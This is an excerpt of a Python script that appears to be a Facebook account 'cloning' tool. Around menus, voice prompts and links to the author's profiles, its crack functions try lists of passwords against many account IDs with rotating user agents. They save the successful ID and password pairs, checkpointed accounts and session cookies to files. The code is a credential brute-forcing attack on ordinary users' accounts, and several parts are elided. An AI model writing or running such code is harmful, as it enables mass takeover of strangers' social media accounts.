...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/mdoleid.mia')
time.sleep(5)
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mWELCOME TO MY FACEBOOK PROFILE")
os.system('espeak -a 300 " WELCOME TO MY FACEBOOK PROFILE"')
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/mdoleid.mia')
#------------------[ DARK-DEVIL-OMI-VAU ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mSHANTO]║\33[1;38m\033[1;31m 
╠══[Facebook                 • SHANTO]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mFUCK YOU🖕 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01849391227 ]  ║\33[1;35m 
╠══[TOOLS                    • TRAIL ]         ║ \33[1;32m   
╠══[VERSION                  • 10.5]           ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
os.system('clear')
...
while key == 'XNXX':
    ...
    if username == CorrectUsername :
            print('\033[1;30m───────────────────────────────────────────\n\033[0;97m[DONE✅]\033[1;32m LOGIN SUCCESSFULLY') 
            os.system('espeak -a 300 " DONE, LOGIN, SUCCESSFULLY,"')
            time.sleep(1)           
            key = 'false'
import os,time
os.system('clear')
...
os.system('espeak -a 300 " Welcome,   to, SHANTO KING ,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m===============================================')
    os.system('espeak -a 300 " CHOOSE 1,   FOR , FILE CLONEING "')
    ...
    if TUTUL in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801406115895')
        os.system("python nono.py")
    elif TUTUL in ['3','03']:
        result()
    elif TUTUL in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/DEVIL.txt  Etc...]')
...
def setting():
    ...
    print('\033[0;91m=============================')
    os.system('espeak -a 300 "  CHOOSE,  3 , FOR ,  MIX IDz CLONEING"')
    ...
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    os.system('espeak -a 300 " CHOOSE,  METHOD 1,  BEST "')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mBEST\033[1;37m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mLOL\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    os.system("xdg-open https://www.facebook.com/papar.link.copy.coro.kn.madarcud")
    if hc in ['1','01']:
...
def passwrd():
    ...
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER SLOW-!☹️")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[SHANTO-M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[BAD-LUCK -cp] {idf} • {pw}')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[OMI-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•BAD-LUCK-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " BAD-LUC,Cp, id"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•OMI-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " OMI,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
